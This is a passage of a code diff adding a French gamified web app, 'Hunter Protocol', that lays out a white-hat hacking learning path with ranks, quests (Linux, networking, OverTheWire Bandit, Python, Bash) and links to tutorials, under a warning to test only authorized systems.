+  /* CODEX MODAL */
+  .codex-modal {
+    background: linear-gradient(135deg, var(--card-bg-1), var(--card-bg-2));
+    border: 2px solid var(--primary);
+    padding: 24px;
+    max-width: 700px;
+    width: 100%;
+    max-height: 85vh;
+    display: flex;
+    flex-direction: column;
+  }
+  .codex-modal h3 { font-family: 'Orbitron', sans-serif; font-size: 20px; color: var(--primary); margin-bottom: 6px; letter-spacing: 0.1em; }
+  .codex-progress { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); margin-bottom: 16px; }
+  .codex-filters { display: flex; gap: 6px; margin-bottom: 14px; flex-wrap: wrap; }
+  .codex-filter { padding: 5px 10px; border: 1px solid var(--border); background: transparent; color: var(--text-dim); cursor: pointer; font-size: 11px; font-family: 'Orbitron', sans-serif; letter-spacing: 0.05em; transition: all 0.2s; }
+  .codex-filter.active { border-color: var(--primary); color: var(--primary); }
+  .codex-list { overflow-y: auto; flex: 1; padding-right: 4px; -webkit-overflow-scrolling: touch; }
+  .codex-list::-webkit-scrollbar { width: 4px; }
+  .codex-list::-webkit-scrollbar-thumb { background: var(--border); }
+  .codex-quote {
+    border-left: 3px solid;
+    padding: 12px 14px;
+    margin-bottom: 10px;
+    background: var(--quest-bg);
+    transition: all 0.3s;
+  }
+  .codex-quote.locked {
+    opacity: 0.45;
+    border-left-color: var(--border) !important;
+    filter: blur(0.5px);
+  }
+  .codex-quote.discovered { border-left-color: var(--primary); }
+  .codex-quote-text { font-style: italic; color: var(--text); font-size: 14px; line-height: 1.4; margin-bottom: 6px; }
+  .codex-quote.locked .codex-quote-text {
+    /* Hide partial chars for locked - keep some shape */
+    color: var(--text-mute);
+    letter-spacing: 0.5px;
+  }
+  .codex-quote-meta { font-size: 11px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; display: flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .codex-quote-source { color: var(--text-mute); }
+  .codex-quote-tag { font-size: 9px; padding: 1px 6px; border: 1px solid; font-family: 'Orbitron', sans-serif; letter-spacing: 0.1em; }
+  .codex-quote-tag.sl { color: #c084fc; border-color: #581c87; }
+  .codex-quote-tag.an { color: #f87171; border-color: #7f1d1d; }
+  .codex-quote-tag.g { color: #fbbf24; border-color: #78350f; }
+  .codex-quote-tag.h { color: #34d399; border-color: #064e3b; }
+  .codex-quote-tag.p { color: #60a5fa; border-color: #1e3a8a; }
+  .codex-quote-tag.r { color: #f59e0b; border-color: #92400e; }
+  .codex-empty { text-align: center; padding: 40px 20px; color: var(--text-mute); font-style: italic; }
+  footer .quote { font-family: 'Orbitron', sans-serif; font-style: italic; color: var(--quote-color); font-size: 13px; margin-bottom: 4px; }
+  footer .version { font-family: 'Orbitron', sans-serif; font-size: 10px; letter-spacing: 0.2em; color: var(--text-mute); margin-top: 16px; }
+
+  .install-hint { background: rgba(34,211,238,0.05); border: 1px solid rgba(34,211,238,0.3); padding: 12px 16px; margin-bottom: 16px; font-size: 12px; color: var(--text-dim); display: none; align-items: center; gap: 10px; }
+  .install-hint.show { display: flex; }
+  .install-hint .close { background: none; border: none; color: var(--text-mute); cursor: pointer; padding: 4px; margin-left: auto; }
+  .install-hint strong { color: var(--accent); }
+</style>
+</head>
+<body>
+
+<canvas class="matrix-rain" id="matrixRain"></canvas>
+<div class="bg-fx" id="bgFx"></div>
+<div class="bg-grid"></div>
+
+<div class="modal-overlay" id="warningModal" style="display:none;">
+  <div class="modal">
+    <div class="modal-title">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      <h2>AVERTISSEMENT DU SYSTÈME</h2>
+    </div>
+    <div class="modal-content">
+      <p>Joueur. Avant d'entrer dans le donjon, le Système exige ta compréhension :</p>
+      <ul>
+        <li><span>Tout ce que tu apprends ici se pratique <strong>UNIQUEMENT</strong> sur des systèmes que tu possèdes ou as l'autorisation écrite de tester.</span></li>
+        <li><span>Pirater sans autorisation = délit pénal (article 323-1 du Code pénal). Pas d'exception.</span></li>
+        <li><span>La cybersécurité éthique = carrière magnifique. La cybercriminalité = prison.</span></li>
+        <li><span>Le chemin est long. Compte 2 à 5 ans pour un vrai niveau pro. C'est NORMAL.</span></li>
+      </ul>
+    </div>
+    <button class="modal-btn" id="acceptWarning">[ J'ACCEPTE — RESTER WHITE HAT ]</button>
+  </div>
+</div>
+
+<div class="modal-overlay" id="resetModal" style="display:none;">
+  <div class="reset-modal">
+    <h3>RÉINITIALISER LE SYSTÈME ?</h3>
+    <p>Tout ton progrès sera perdu. Cette action est irréversible.</p>
+    <div class="reset-actions">
+      <button class="btn-cancel" id="cancelReset">Annuler</button>
+      <button class="btn-confirm" id="confirmReset">Confirmer</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="settingsModal" style="display:none;">
+  <div class="settings-modal">
+    <h3>// PARAMÈTRES SYSTÈME</h3>
+
+    <div class="settings-section">
+      <div class="settings-label">▸ THÈME VISUEL</div>
+      <div class="theme-grid">
+        <button class="theme-btn" data-theme-btn="solo">⚔️ SOLO LEVELING</button>
+        <button class="theme-btn" data-theme-btn="cyber">🌃 CYBERPUNK</button>
+        <button class="theme-btn" data-theme-btn="matrix">💻 MATRIX</button>
+        <button class="theme-btn" data-theme-btn="anonymous">🎭 ANONYMOUS</button>
+      </div>
+    </div>
+
+    <div class="settings-section">
+      <div class="settings-label">▸ AUDIO</div>
+      <div class="toggle-row">
+        <label>Effets sonores (clic, level up)</label>
+        <button class="toggle on" id="toggleSfx"></button>
+      </div>
+      <div class="toggle-row">
+        <label>Voix synthétique "Quest Complete"</label>
+        <button class="toggle" id="toggleVoice"></button>
+      </div>
+    </div>
+
+    <button class="settings-close" id="closeSettings">[ FERMER ]</button>
+  </div>
+</div>
+
+<div class="modal-overlay" id="codexModal" style="display:none;">
+  <div class="codex-modal">
+    <h3>// CODEX DES PHRASES DU MONARQUE</h3>
+    <div class="codex-progress" id="codexProgress">0 / 0 découvertes</div>
+    <div class="codex-filters" id="codexFilters">
+      <button class="codex-filter active" data-filter="all">TOUTES</button>
+      <button class="codex-filter" data-filter="discovered">DÉCOUVERTES</button>
+      <button class="codex-filter" data-filter="locked">VERROUILLÉES</button>
+      <button class="codex-filter" data-filter="sl">SOLO LEVELING</button>
+      <button class="codex-filter" data-filter="an">ANIMÉS</button>
+      <button class="codex-filter" data-filter="g">GAMES</button>
+      <button class="codex-filter" data-filter="h">HACKERS</button>
+      <button class="codex-filter" data-filter="p">PHILO</button>
+    </div>
+    <div class="codex-list" id="codexList"></div>
+    <button class="settings-close" id="closeCodex" style="margin-top:14px;">[ FERMER ]</button>
+  </div>
+</div>
+
+<div class="level-up-overlay" id="levelUpOverlay">
+  <div class="level-up-bg"></div>
+  <div class="level-up-aura" id="luAura"></div>
+  <div class="level-up-rays" id="luRays"></div>
+  <div class="level-up-content">
+    <div class="level-up-tag" id="luTag">[ NIVEAU SUPÉRIEUR ]</div>
+    <div class="level-up-letter" id="luLetter" data-letter="A">A</div>
+    <div class="level-up-name" id="luName">CHASSEUR</div>
+    <div class="level-up-sub" id="luSub">Spécialisation</div>
+    <div class="level-up-arise" id="luArise">« ARISE. »</div>
+  </div>
+</div>
+
+<div class="notification" id="notification">
+  <div class="notif-tag" id="notifTag">QUÊTE COMPLÉTÉE</div>
+  <div class="notif-title" id="notifTitle"></div>
+  <div class="notif-stats" id="notifStats"></div>
+</div>
+
+<div class="container">
+  <header>
+    <div class="top-bar">
+      <div class="system-tag">[ SYSTÈME ACTIF ]</div>
+      <div class="top-bar-right">
+        <button class="icon-btn" id="codexBtn" aria-label="Codex" title="Codex des Phrases">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
+        </button>
+        <button class="icon-btn" id="settingsBtn" aria-label="Paramètres">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+        </button>
+        <button class="reset-btn" id="resetBtn">RESET</button>
+      </div>
+    </div>
+    <h1 class="title" id="mainTitle">HUNTER PROTOCOL</h1>
+    <p class="subtitle">VOIE DU HACKER · CHASSEUR JEREMIE · v8.0</p>
+
+    <div class="install-hint" id="installHint">
+      <span>📱 <strong>Astuce</strong> : Ajoute cette page à ton écran d'accueil pour l'utiliser comme une vraie app.</span>
+      <button class="close" id="closeInstallHint">✕</button>
+    </div>
+
+    <div class="quote-banner" id="quoteBanner" style="display:none;">
+      <div class="quote-banner-tag" id="qbTag">[ MESSAGE DU SYSTÈME ]</div>
+      <div class="quote-banner-text" id="qbText"></div>
+      <div class="quote-banner-author">— <span id="qbAuthor"></span><span class="source" id="qbSource"></span></div>
+      <span class="quote-banner-new" id="qbNew" style="display:none;">NOUVEAU</span>
+      <button class="quote-refresh" id="qbRefresh" aria-label="Nouvelle citation" title="Nouvelle citation">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+      </button>
+    </div>
+
+    <div class="status-grid">
+      <div class="status-card" id="rankCard">
+        <div class="rank-row">
+          <div class="rank-letter" id="rankLetter">E</div>
+          <div>
+            <div class="rank-info-label">RANG ACTUEL</div>
+            <div class="rank-info-name" id="rankName">L'ÉVEIL</div>
+            <div class="rank-info-sub" id="rankSub">Les Fondations</div>
+          </div>
+        </div>
+        <div>
+          <div class="xp-row">
+            <span class="left" id="xpText">XP : 0 / 400</span>
+            <span id="xpPct" style="color:var(--rank-glow);">0.0%</span>
+          </div>
+          <div class="xp-bar-wrap"><div class="xp-bar" id="xpBar" style="width:0%;"></div></div>
+          <div class="total-xp" id="totalXp">TOTAL XP : 0</div>
+        </div>
+      </div>
+      <div class="stats-card">
+        <div class="stats-label">STATS</div>
+        <div id="statsList"></div>
+      </div>
+    </div>
+  </header>
+
+  <div class="section-label">// DONJONS</div>
+  <div class="rank-tabs" id="rankTabs"></div>
+
+  <div class="quests" id="questsList"></div>
+
+  <footer>
+    <div class="quote" id="footerQuote">« Le faible n'a pas de choix. »</div>
+    <div class="quote" id="footerQuoteAuthor" style="font-size:11px;font-style:normal;opacity:0.7;">— Sung Jinwoo</div>
+    <div class="version">HUNTER PROTOCOL · v8.0 · WHITE HAT ONLY</div>
+  </footer>
+</div>
+
+<script>
+// ============= DATA =============
+// XP requis rééquilibrés : un peu en-dessous du total disponible pour que finir toutes les quêtes = level up garanti
+const RANKS = [
+  { id: 'E', name: "L'ÉVEIL", subtitle: "Les Fondations", color: '#dc2626', glow: '#ef4444', duration: '1-2 mois', xpToNext: 400 },
+  { id: 'D', name: "L'INITIÉ", subtitle: "Le Code & La Logique", color: '#ea580c', glow: '#fb923c', duration: '2-3 mois', xpToNext: 800 },
+  { id: 'C', name: "LE CHASSEUR", subtitle: "Sécurité Offensive Basique", color: '#ca8a04', glow: '#facc15', duration: '3-4 mois', xpToNext: 1310 },
+  { id: 'B', name: "CHASSEUR D'ÉLITE", subtitle: "Pentest Avancé", color: '#0891b2', glow: '#22d3ee', duration: '4-6 mois', xpToNext: 2020 },
+  { id: 'A', name: "CHASSEUR S", subtitle: "Spécialisation", color: '#2563eb', glow: '#60a5fa', duration: '6-12 mois', xpToNext: 3500 },
+  { id: 'S', name: "LE MONARQUE", subtitle: "Maîtrise & Influence", color: '#9333ea', glow: '#c084fc', duration: '1 an+', xpToNext: 99999 },
+];
+
+const ICONS = {
+  terminal: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
+  wifi: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>',
+  flame: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/></svg>',
+  skull: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="9" cy="12" r="1"/><circle cx="15" cy="12" r="1"/><path d="M8 20v2h8v-2"/><path d="M12.5 17l-.5-1-.5 1h1z"/><path d="M16 20a2 2 0 0 0 1.56-3.25 8 8 0 1 0-11.12 0A2 2 0 0 0 8 20"/></svg>',
+  code: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>',
+  eye: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
+  bug: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="8" y="6" width="8" height="14" rx="4"/><path d="m19 7-3 2"/><path d="m5 7 3 2"/><path d="m19 19-3-2"/><path d="m5 19 3-2"/><path d="M20 13h-4"/><path d="M4 13h4"/><path d="m10 4 1 2"/><path d="m14 4-1 2"/></svg>',
+  sword: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="14.5 17.5 3 6 3 3 6 3 17.5 14.5"/><line x1="13" y1="19" x2="19" y2="13"/><line x1="16" y1="16" x2="20" y2="20"/><line x1="19" y1="21" x2="21" y2="19"/></svg>',
+  shield: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
+  zap: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
+  cpu: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
+  trophy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"/><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"/><path d="M4 22h16"/><path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"/><path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"/><path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"/></svg>',
+  brain: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9.5 2A2.5 2.5 0 0 1 12 4.5v15a2.5 2.5 0 0 1-4.96.44 2.5 2.5 0 0 1-2.96-3.08 3 3 0 0 1-.34-5.58 2.5 2.5 0 0 1 1.32-4.24 2.5 2.5 0 0 1 1.98-3A2.5 2.5 0 0 1 9.5 2Z"/><path d="M14.5 2A2.5 2.5 0 0 0 12 4.5v15a2.5 2.5 0 0 0 4.96.44 2.5 2.5 0 0 0 2.96-3.08 3 3 0 0 0 .34-5.58 2.5 2.5 0 0 0-1.32-4.24 2.5 2.5 0 0 0-1.98-3A2.5 2.5 0 0 0 14.5 2Z"/></svg>',
+  heart: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.29 1.51 4.04 3 5.5l7 7Z"/></svg>',
+  sparkles: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 3-1.9 5.8a2 2 0 0 1-1.3 1.3L3 12l5.8 1.9a2 2 0 0 1 1.3 1.3L12 21l1.9-5.8a2 2 0 0 1 1.3-1.3L21 12l-5.8-1.9a2 2 0 0 1-1.3-1.3Z"/></svg>',
+  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>',
+  lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
+  external: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>',
+  chevron: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>',
+  video: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>',
+  book: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>',
+  wrench: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>',
+  list: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>',
+  globe: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
+};
+
+const v = (text, url, lang) => ({ text, url, lang });
+
+const QUESTS = {
+  E: [
+    {
+      id: 'e-main-1', type: 'main', icon: 'terminal', xp: 80, title: 'Maîtriser le Terrain — Linux',
+      objectives: [
+        { id: 'e1-1', text: 'Installer Linux (Ubuntu/Mint) en dual-boot ou VM' },
+        { id: 'e1-2', text: 'Maîtriser les commandes de base : ls, cd, grep, find, chmod, sudo' },
+        { id: 'e1-3', text: "Comprendre l'arborescence Linux (/etc, /var, /home, /bin)" },
+        { id: 'e1-4', text: 'Apprendre vim ou nano (édition de fichiers en CLI)' },
+        { id: 'e1-5', text: 'Naviguer SANS la souris pendant 1 semaine' },
+      ],
+      resources: {
+        videos: [
+          v('Linux for Hackers EP1 (NetworkChuck)', 'https://www.youtube.com/watch?v=VbEx7B_PTOE', 'EN'),
+          v('Tutos Linux pour débutants (FR)', 'https://www.youtube.com/results?search_query=apprendre+linux+débutants+français', 'FR'),
+          v('Linux File System EP2 (NetworkChuck)', 'https://www.youtube.com/watch?v=A3G-3hp88mo', 'EN'),
+          v('Hackintux — Linux & Cybersécu (FR)', 'https://www.youtube.com/results?search_query=Hackintux+linux+cybersécurité', 'FR'),
+        ],
+        platforms: [
+          v('LinuxJourney — interactif', 'https://linuxjourney.com/', 'EN'),
+          v('OverTheWire Bandit', 'https://overthewire.org/wargames/bandit/', 'EN'),
+          v('Ubuntu Desktop', 'https://ubuntu.com/download/desktop', 'EN'),
+          v('Linux Mint', 'https://linuxmint.com/', 'EN'),
+        ],
+        articles: [
+          v('Linuxfr — actu Linux', 'https://linuxfr.org/sections/depeches', 'FR'),
+          v('TLDP — Linux Documentation', 'https://tldp.org/', 'EN'),
+        ],
+        cheats: [
+          v('Linux Commands Cheat Sheet', 'https://phoenixnap.com/kb/linux-commands-cheat-sheet', 'EN'),
+          v('Vim Cheat Sheet', 'https://vim.rtorr.com/', 'EN'),
+          v('tldr.sh', 'https://tldr.sh/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'e-main-2', type: 'main', icon: 'wifi', xp: 80, title: 'Comprendre les Réseaux',
+      objectives: [
+        { id: 'e2-1', text: 'Modèle OSI et TCP/IP — les 7 couches par cœur' },
+        { id: 'e2-2', text: 'Adressage IP, masques, sous-réseaux (CIDR)' },
+        { id: 'e2-3', text: 'Protocoles : HTTP/HTTPS, DNS, DHCP, SSH, FTP' },
+        { id: 'e2-4', text: 'Wireshark : capturer et lire ton premier paquet' },
+        { id: 'e2-5', text: 'Comprendre NAT, ports, firewall basique' },
+      ],
+      resources: {
+        videos: [
+          v('OSI Model Explained (TechTerms)', 'https://www.youtube.com/watch?v=vv4y_uOneC0', 'EN'),
+          v('Subnetting Mastery (Practical Networking)', 'https://www.youtube.com/playlist?list=PLIFyRwBY_4bQUE4IB5c4VPRyDoLgOdExE', 'EN'),
+          v('Tutos Réseau & DevOps (FR)', 'https://www.youtube.com/results?search_query=cocadmin+linux+devops+français', 'FR'),
+          v('Wireshark Free Course (David Bombal)', 'https://www.youtube.com/watch?v=QXfaGOMT7MY', 'EN'),
+        ],
+        platforms: [
+          v('Wireshark (download)', 'https://www.wireshark.org/', 'EN'),
+          v('Cisco Packet Tracer', 'https://www.netacad.com/courses/packet-tracer', 'EN'),
+          v('Practical Networking', 'https://www.practicalnetworking.net/', 'EN'),
+        ],
+        articles: [
+          v('How DNS Works (Cloudflare)', 'https://www.cloudflare.com/learning/dns/what-is-dns/', 'EN'),
+          v('TCP vs UDP (frameip)', 'https://www.frameip.com/tcp/', 'FR'),
+          v('IT-Connect — réseau', 'https://www.it-connect.fr/cours-tutoriels/administration-reseaux/', 'FR'),
+        ],
+        cheats: [
+          v('CIDR Cheat Sheet', 'https://packetlife.net/media/library/15/IPv4_Subnetting.pdf', 'EN'),
+          v('Common Ports', 'https://packetlife.net/media/library/23/common_ports.pdf', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'e-daily', type: 'daily', icon: 'flame', xp: 40, title: 'Daily Quests — Quotidien',
+      objectives: [
+        { id: 'ed-1', text: '30 min de terminal Linux par jour' },
+        { id: 'ed-2', text: 'Lire 1 article cybersécu' },
+        { id: 'ed-3', text: '10 min sur OverTheWire — Bandit' },
+        { id: 'ed-4', text: 'Suivre 3 personnes infosec sur Twitter/Mastodon' },
+      ],
+      resources: {
+        articles: [
+          v('The Hacker News', 'https://thehackernews.com/', 'EN'),
+          v('Krebs on Security', 'https://krebsonsecurity.com/', 'EN'),
+          v('Le Mag IT — Sécurité', 'https://www.lemagit.fr/securite', 'FR'),
+          v('Bleeping Computer', 'https://www.bleepingcomputer.com/', 'EN'),
+          v('Zataz', 'https://www.zataz.com/', 'FR'),
+        ],
+        platforms: [
+          v('OverTheWire Bandit', 'https://overthewire.org/wargames/bandit/', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'e-boss', type: 'boss', icon: 'skull', xp: 200, title: 'BOSS — Bandit (OverTheWire)',
+      objectives: [
+        { id: 'eb-1', text: 'Compléter Bandit niveaux 0 à 5' },
+        { id: 'eb-2', text: 'Compléter Bandit niveaux 6 à 10' },
+        { id: 'eb-3', text: 'Compléter Bandit niveaux 11 à 15' },
+        { id: 'eb-4', text: 'BONUS : Compléter Bandit jusqu\'au niveau 25' },
+      ],
+      resources: {
+        platforms: [
+          v('OverTheWire Bandit', 'https://overthewire.org/wargames/bandit/', 'EN'),
+        ],
+        videos: [
+          v('Bandit Walkthrough (LiveOverflow)', 'https://www.youtube.com/results?search_query=overthewire+bandit+walkthrough+liveoverflow', 'EN'),
+          v('Bandit en français', 'https://www.youtube.com/results?search_query=overthewire+bandit+français', 'FR'),
+        ],
+        articles: [
+          v('Writeups Bandit', 'https://github.com/topics/overthewire-bandit', 'EN'),
+        ],
+      }
+    },
+  ],
+  D: [
+    {
+      id: 'd-main-1', type: 'main', icon: 'code', xp: 120, title: "Python — L'Arme Principale",
+      objectives: [
+        { id: 'd1-1', text: 'Variables, types, conditions, boucles, fonctions' },
+        { id: 'd1-2', text: 'Listes, dicts, sets, compréhensions' },
+        { id: 'd1-3', text: 'Fichiers, exceptions, modules' },
+        { id: 'd1-4', text: 'Requests (HTTP), Socket (réseau), os/subprocess' },
+        { id: 'd1-5', text: 'Écrire ton propre scanner de ports en Python' },
+        { id: 'd1-6', text: 'Comprendre les threads et asyncio' },
+      ],
+      resources: {
+        videos: [
+          v('Python pour hackers (FR)', 'https://www.youtube.com/results?search_query=cocadmin+linux+devops+français', 'FR'),
+          v('Python Full Course (freeCodeCamp 4h)', 'https://www.youtube.com/watch?v=rfscVS0vtbw', 'EN'),
+          v('Python for Pentesters (HackerSploit)', 'https://www.youtube.com/results?search_query=python+for+pentesters+hackersploit', 'EN'),
+          v('Apprendre Python (FR)', 'https://www.youtube.com/results?search_query=apprendre+python+français+débutant', 'FR'),
+        ],
+        platforms: [
+          v('learnpython.org', 'https://www.learnpython.org/', 'EN'),
+          v('Codewars', 'https://www.codewars.com/', 'EN'),
+          v('Exercism Python', 'https://exercism.org/tracks/python', 'EN'),
+          v('Real Python', 'https://realpython.com/', 'EN'),
+        ],
+        articles: [
+          v('Python Docs (FR)', 'https://docs.python.org/fr/3/', 'FR'),
+          v('Black Hat Python (livre)', 'https://nostarch.com/black-hat-python2E', 'EN'),
+        ],
+        tools: [
+          v('PyCharm Community', 'https://www.jetbrains.com/pycharm/', 'EN'),
+          v('VS Code', 'https://code.visualstudio.com/', 'EN'),
+        ],
+        cheats: [
+          v('Python Cheat Sheet', 'https://www.pythoncheatsheet.org/', 'EN'),
+          v('Awesome Python Security', 'https://github.com/guardrailsio/awesome-python-security', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'd-main-2', type: 'main', icon: 'terminal', xp: 80, title: 'Bash Scripting',
+      objectives: [
+        { id: 'd2-1', text: 'Variables, conditions, boucles en bash' },
+        { id: 'd2-2', text: 'Pipes, redirections, awk, sed' },
+        { id: 'd2-3', text: 'Automatiser une tâche répétitive avec un script' },
+        { id: 'd2-4', text: 'Comprendre exit codes et chaînage' },
+      ],
+      resources: {
+        videos: [
+          v('Bash Scripting Tutorial', 'https://www.youtube.com/results?search_query=bash+scripting+tutorial+complete+beginners', 'EN'),
+          v('Bash for Beginners (MS Dev)', 'https://www.youtube.com/results?search_query=bash+for+beginners+microsoft+developer', 'EN'),
+        ],
+        platforms: [
+          v('learnshell.org', 'https://www.learnshell.org/', 'EN'),
+          v('explainshell.com', 'https://explainshell.com/', 'EN'),
+          v('shellcheck', 'https://www.shellcheck.net/', 'EN'),
+        ],
+        cheats: [
+          v('Bash Cheat Sheet', 'https://devhints.io/bash', 'EN'),
+          v('Awesome Bash', 'https://github.com/awesome-lists/awesome-bash', 'EN'),
+        ],
+      }
+    },
+    {
+      id: 'd-main-3', type: 'main', icon: 'globe', xp: 80, title: 'Web Fundamentals',
+      objectives: [
